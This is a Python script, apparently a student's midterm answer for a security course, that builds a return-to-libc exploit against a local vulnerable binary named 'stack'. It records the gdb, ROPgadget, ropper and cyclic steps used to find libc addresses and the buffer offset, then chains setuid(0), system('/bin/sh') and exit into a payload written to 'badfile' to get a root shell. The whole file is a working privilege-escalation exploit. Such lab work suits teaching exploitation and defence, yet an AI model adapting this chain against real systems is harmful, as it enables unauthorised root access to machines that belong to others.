# Elijah Lieu
# Dr. Xin Liu
# CIS5370
# Midterm

def to_bytes(value):
   return (value).to_bytes(8,byteorder='little')


# ldd ./stack
libc_addr = 0x00007ffff7c00000

# gdb ./stack
# b main
# run
# find 0x00007ffff7c00000, 0x00007ffffff00000, "/bin/sh"
binsh_addr = 0x7ffff7dcb42f

# p system
system_addr = 0x7ffff7c58750

# p exit
exit_addr = 0x7ffff7c47ba0

# p setuid
setuid_addr = 0x7ffff7d0ea90

# quit


# sudo apt install pipx
# pipx install ropgadget
# pipx ensurepath
# (needed to restart shell to get access to ROPgadget)

# I need the following gadgets:
# pop rdi; ret
# add rsp ???
# ret (for alignment purposes)

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"
# 0x000000000010f75b : pop rdi ; ret
rdi_addr = 0x000000000010f75b + libc_addr

# pipx install ropper
# ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "add rsp"
# 0x0000000000045832: add rsp, 0x90; pop rbx; pop r12; pop rbp; ret;
rsp_addr = 0x0000000000045832 + libc_addr

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": ret"
# 0x000000000002882f : ret
ret_addr = 0x000000000002882f + libc_addr

# rsp 0x7ffff7c45832
# rdi 0x7ffff7d0f75b
# binsh 0x7ffff7dcb42f
# system 0x7ffff7c58750
# exit 0x7ffff7c47ba0


# payload needs to be (in order)
# offset
# rsp gadget
# rdi gadget
# /bin/sh address
# system address
# rdi gadget
# 0
# exit address


# find offset using gdb and cyclic
# pipx install pwntools
# cyclic 200 > badfile
# gdb ./stack
# run
# x/gx $rsp
# >>> 0x6261616762616166
# cyclic -l 0x6261616762616166
# >>> 120

# this offset is where rsp gadget will go, but the rest of the payload
# needs to go where rsp gets added to, which is 32 bytes above this offset
offset = 120
real_offset = 32

payload = b"A" * offset
payload += to_bytes(rsp_addr)
payload += b"B" * (real_offset - 8) # 8 bytes from the rsp gadget

payload += to_bytes(rdi_addr)
payload += to_bytes(0)
payload += to_bytes(ret_addr) 
payload += to_bytes(setuid_addr)

payload += to_bytes(rdi_addr)
payload += to_bytes(binsh_addr)
# according to gdb this is required is because of an alignment error without it
# otherwise, the payload is not aligned to 16 bytes, only 8 bytes
# a simple ret gadget adds 8 bytes to the payload without breaking anything
payload += to_bytes(ret_addr) 
payload += to_bytes(system_addr)

payload += to_bytes(rdi_addr)
payload += to_bytes(0)
payload += to_bytes(exit_addr)

print(payload)

with open("badfile", "wb") as f:
    f.write(payload)




